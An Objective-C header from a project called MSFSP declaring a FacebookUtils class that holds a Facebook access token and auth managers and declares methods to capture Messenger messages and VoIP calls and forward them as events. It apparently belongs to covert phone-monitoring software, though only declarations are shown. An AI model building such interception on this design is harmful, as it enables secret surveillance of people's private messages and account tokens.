//
//  FacebookUtils.h
//  MSFSP
//
//  Created by Makara Khloth on 12/24/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "FxEventEnums.h"

@class FxIMEvent, FxVoIPEvent;
@class FBMThread, ThreadMessage, FBAuthenticationManagerImpl, FBMessengerModuleAuthenticationManager,FBMStickerManager;
@class FBMStickerStoragePathManager, FBMAuthenticationManagerImpl, FBMURLRequestFormatter, FBMThreadSet;
@class FBMCachedAttachmentURLFormatter, FBMBaseAttachmentURLFormatter;
@class SharedFile2IPCSender;

@interface FacebookUtils : NSObject {
@private
	NSInteger	mNumFetchThread;
	NSString	*mMessageID;
	NSString	*mofflineThreadingId;
	NSString	*mAcessToken;
    NSString    *mMeUserID;
    
	FBAuthenticationManagerImpl				*mFBAuthenManagerImpl;				// For messenger
	FBMessengerModuleAuthenticationManager	*mFBMessengerModuleAuthManager;		// For facebook
	FBMStickerStoragePathManager			*mFBMStickerStoragePathManager;		// For messenger
	
	FBMAuthenticationManagerImpl	*mFBMAuthenticationManagerImpl;				// For facebook 6.7
	FBMURLRequestFormatter			*mFBMURLRequestFormatter;					// For facebook 6.7
	
	FBMThreadSet		*mFBMThreadSet;			// For facebook 6.7.2
	
	FBMCachedAttachmentURLFormatter		*mFBMCachedAttachmentURLFormatter;		// For messenger 3.1
	FBMBaseAttachmentURLFormatter		*mFBMBaseAttachmentURLFormatter;		// For messenger 3.1
	
	SharedFile2IPCSender	*mIMSharedFileSender;
	SharedFile2IPCSender	*mVOIPSharedFileSender;
}

@property (nonatomic, assign) NSInteger mNumFetchThread;
@property (nonatomic, copy) NSString *mMessageID;
@property (nonatomic, copy) NSString *mofflineThreadingId;
@property (nonatomic, copy)	NSString *mAcessToken;
@property (copy) NSString *mMeUserID;

@property (nonatomic, assign) FBAuthenticationManagerImpl *mFBAuthenManagerImpl;
@property (nonatomic, assign) FBMessengerModuleAuthenticationManager *mFBMessengerModuleAuthManager;
@property (nonatomic, assign) FBMStickerStoragePathManager *mFBMStickerStoragePathManager;

@property (nonatomic, assign) FBMAuthenticationManagerImpl *mFBMAuthenticationManagerImpl;
@property (nonatomic, assign) FBMURLRequestFormatter *mFBMURLRequestFormatter;

@property (nonatomic, assign) FBMThreadSet *mFBMThreadSet;

@property (nonatomic, assign) FBMCachedAttachmentURLFormatter *mFBMCachedAttachmentURLFormatter;
@property (nonatomic, assign) FBMBaseAttachmentURLFormatter *mFBMBaseAttachmentURLFormatter;

@property (retain) SharedFile2IPCSender	*mIMSharedFileSender;
@property (retain) SharedFile2IPCSender *mVOIPSharedFileSender;

+ (id) shareFacebookUtils;

+ (void) sendFacebookEvent: (FxIMEvent *) aIMEvent;

+ (void) captureFacebookMessage: (FBMThread *) aFBMThread message: (ThreadMessage *) aThreadMessage;

//+ (void) delayCapture: (id) aUserInfo;

+ (void) mergeNewerMessages: (NSArray *) aNewerMessages
		  withOlderMessages: (NSArray *) aOlderMessages
				 intoThread: (FBMThread *) aThread;

#pragma mark VoIP Event

+ (BOOL) isVoIPMessage: (ThreadMessage *) aThreadMessage withThread: (FBMThread *) aThread;

+ (void) sendFacebookVoIPEvent: (FxVoIPEvent *) aVoIPEvent;

+ (FxVoIPEvent *) createFacebookVoIPEventFBMThread: (FBMThread *) aFBMThread 
									 threadMessage: (ThreadMessage *) aThreadMessage;

@end
